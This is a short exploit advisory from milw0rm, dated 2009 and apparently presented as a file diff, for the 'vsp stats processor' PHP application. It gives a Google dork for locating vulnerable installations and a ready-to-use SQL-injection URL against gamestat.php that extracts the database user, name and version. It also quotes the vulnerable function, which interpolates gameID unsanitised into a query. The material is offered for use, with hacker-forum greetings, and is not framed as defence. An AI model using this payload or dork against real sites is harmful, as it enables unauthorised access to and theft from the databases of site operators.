@@ -1,0 +1,37 @@
+########################################
+#                                         #
+# Product : vsp stats processor           #
+# Version : all                           #
+# Dork : "powered by vsp stats processor" #
+# Site: http://www.scivox.net/vsp/        #
+# Found by: Dimi4                         #
+# Date : 31.03.09                         #
+# Greetz: antichat                        #
+#                                         #
+########################################
+
+SQL-injection
+[+] URL: http://target.com/vsp-core/pub/themes/bismarck/gamestat.php?gameID=-1+union+select+concat_ws(0x203a20,user(),database(),version()),2/*&config=cfg-default.php
+[+] Output: <option> {DATA} </option>
+
+Bug Function: (vsp-core\pub\themes\bismarck\gamestat.php 540-558 lines)
+
+ function getStatsGame()
+{
+  global $db;
+  global $ggame;
+  $sql = "select name, value
+            from {$GLOBALS['cfg']['db']['table_prefix']}gamedata
+            where gameID=$GLOBALS[gameID]
+         ";
+
+  //echo $sql;
+  $rs = $db->Execute($sql);
+
+.....
+}
+
+
+(c) Dimi4, 2009 greetz to antichat
+
+# milw0rm.com [2009-03-31]
